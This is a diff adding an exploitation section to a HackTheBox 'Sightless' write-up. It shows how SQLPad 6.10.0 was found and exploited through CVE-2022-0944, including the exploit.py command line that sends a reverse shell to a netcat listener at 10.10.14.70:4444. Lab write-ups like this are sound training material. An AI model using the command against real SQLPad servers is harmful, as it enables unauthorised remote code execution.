@@ -3,7 +3,7 @@ title: Sightless - HackTheBox
 authors: Samarth
 date: 2024-12-01 16:30:00 +0530
 categories: [HackTheBox Machines]
-tags: [Linux, FTPd, Web ]
+tags: [Linux, FTPd, Web, CVE-2022-0944 ]
 math: true
 mermaid: true
 ---
@@ -75,4 +75,49 @@ ID           Response   Lines    Word       Chars    Payload
 000004255:   200        105 L    389 W      4993 Ch  "http://sightless.htb/"                                  
 000006462:   301        7 L      12 W       178 Ch   "icones"  
 ```
+
+I haven't found anything interesting while directory fuzzing. Let's browse the website and try to find some information.
+
+While browsing the website, I have found one subdomain `sqlpad.sightless.htb`.
+
+![Subdomain Browser View](/assets/images/writeups/Sightless-HTB/2.png)
+
+Let's browse the SQLPad website and enumerate it to run SQL queries or find something interesting.
+
+![SQLPad Version](/assets/images/writeups/Sightless-HTB/3.png)
+
+I have found `SQLPad` version as `6.10.0`. Let's browse Google and try to find exploit for this SQLPad version if any exists.
+
+SQLPad version 6.10.0 is vulnerable to <b>[__`CVE-2022-0944`__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)</b>. 
+
+## Exploitation
+
+`CVE-2022-0944` - Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.
+
+Let's use this exploit to perform template injection in new SQLPad query. 
+
+```bash
+python3 exploit.py http://sqlpad.sightless.htb/ <Listener IP> <Listener Port>
+```
+
+The above exploit requires target, listener IP address and listener port. Before using the above exploit, let's open netcat listener on port 4444. Exploit will send the query to the server and server initiate new connection along with payload and then send back the shell to netcat listener.
+
+```bash
+python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.70 4444
+Response status code: 400
+Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
+Exploit sent, but server responded with status code: 400. Check your listener.
+```
+
+Once the exploit sent to the server, let's check netcat listener if the shell is received or not.
+
+![Netcat Listener](/assets/images/writeups/Sightless-HTB/4.png)
+
+
+
+
+
+
+
+
 
